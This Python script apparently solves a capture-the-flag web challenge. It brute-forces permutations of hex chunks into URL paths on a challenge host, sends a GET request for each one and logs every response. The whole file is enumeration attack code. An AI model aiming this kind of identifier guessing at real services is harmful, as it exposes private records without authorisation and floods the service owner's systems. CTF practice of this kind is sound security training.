import itertools
import requests

# Input: 4 UUIDs, with 3 known and 1 selected from list of values

# === USER CONFIGURATION ===
# All available hex chunks (must be strings)
hex_chunks = [
    '19ebb9', # Cod nar thax (street), 
    '5c599a', # Mack fupxvcx (city)
    '59a95', # Walleye p (zip)
    # Halibut metrod (state)
    '8c6d28', '5719d3', '3c9aa1', 'a929c6', '82f6a5', '7b92d5', '2965f8', '0a9e64', '79193f', 'a17506', 'c5b1bb', '546f03', '3e62f0', '98fa05', 'e65764', 'b88ee1', 'c1e830', 'f4c5f4', '4ea9b7', '1be26d', '4b059e', '1f46cd', '24f05d', 'a1e8ac', '96f60b', '4fd2e0', 'f0071a', 'deaefc', 'b2de4f', '35e12c', '0508d3', 'bf3212', '36418e', 'c2939c', '790bd2', '235c15', '14f29b', '21f3ce', 'a1780a', '9fb01b', 'a53fa6', '156b86', '6c622c', 'd588e4', '1358c0', '1e2f21', '43cc66', '90a423', '0fe2bd', '348ed9', '2c7e93', '4c0252', '929837', '10d38b', 'bccb43', '6b7c29', '3d84bf', '07d5f6', '', 'c234f4', '119515', '02e7bf', 'b220ff', '98762c', 'f99d98', '8e4629', 'b20e52', '610728', '0ff848', 'ecc427', 'b69d36', '50c917', '9329b7', 'd560f9', '654ec0', '5b1577', '5bbb90', '3ef113', '2ae379', 'c5f6f5', '565844', 'b1f3b6', '7b2b6f', '4a3ab1', '02e597', '4d8667', '2f5048', '4f8169', 'a65297', 'c06bce', '28bd4b', 'e199bb', '15b572', '9f608f', 'bd1510', '31bd4d', '200e47', 'f2e7cc', 'f98ffb', '589cee', '3ae86a', '29cc60', 'f916a3', '387835', 'feccf3', '8d849f', 'd641b7', 'cefe47', '33a3cb', 'd147aa', '6568fe', 'f2017d', '2305ea', '1eeaeb', 'f6f07b', '9fbda9', '04c2e8', '875440', '1979e5', 'fb6dba', '36a332', '36a332', '989b87', '9cec9b', '2e3bb4', 'd398b7', '71699a', '62aca2', '8083d4', 'dd0cb6', '68a3b0', 'd121b3', '6d0c9c', '945c32', 'c5e5aa', '135e30', '5d9ecf', 'ec0174', 'd565c4',
]

required_chunks = [
    '19ebb9', # Cod nar thax (street), 
    '5c599a', # Mack fupxvcx (city)
    '59a95' # Walleye p (zip)
    ]

# Number of total chunks to use for each UUID
uuid_chunk_count = 1

# Output log file
log_file = "l_a_results.txt"

# Base URL template
BASE_URL = "https://target-flask.chals.io/l/a/{}/?_a={}&cc={}&g={}"
# === END USER CONFIGURATION SECTION ===

def generate_valid_sets(chunks, required_chunks):
    needed = 4  # total UUIDs in URL
    if len(required_chunks) > needed:
        print("[!] Too many required chunks!")
        return []

    remaining = [c for c in chunks if c not in required_chunks]
    num_extra = needed - len(required_chunks)

    valid_sets = []
    for extra in itertools.combinations(remaining, num_extra):
        full_set = required_chunks + list(extra)
        for perm in itertools.permutations(full_set):
            valid_sets.append(perm)

    print(f"[+] Generated {len(valid_sets)} valid URL sets.")
    return valid_sets

def test_urls(perms):
    print("[*] Starting tests...\n")
    with open(log_file, "w", encoding="utf-8") as f:
        for i, (u1, u2, u3, u4) in enumerate(perms):
            url = BASE_URL.format(u1, u2, u3, u4)
            print(f"[{i+1}] Testing: {url}")
            try:
                response = requests.get(url)
                print(f" → Status: {response.status_code}")
                if response.status_code == 200:
                    print(" → ✅ Success")
                f.write(f"URL: {url}\nStatus: {response.status_code}\nResponse: {response.text}\n\n")
            except requests.RequestException as e:
                print(f" → ❌ Error: {e}")
                f.write(f"URL: {url}\nError: {e}\n\n")

if __name__ == "__main__":
    print("=== UUID API Tester (Fast Mode) ===\n")
    print(f"[*] Chunks provided: {len(hex_chunks)}")
    print(f"[*] Required chunks: {required_chunks}\n")

    if len(hex_chunks) < 4:
        print("[!] Not enough chunks to generate a full URL.")
    else:
        valid_url_sets = generate_valid_sets(hex_chunks, required_chunks)
        if valid_url_sets:
            test_urls(valid_url_sets)
        else:
            print("[!] No valid sets found.")

    print("\n[*] Finished. Results in:", log_file)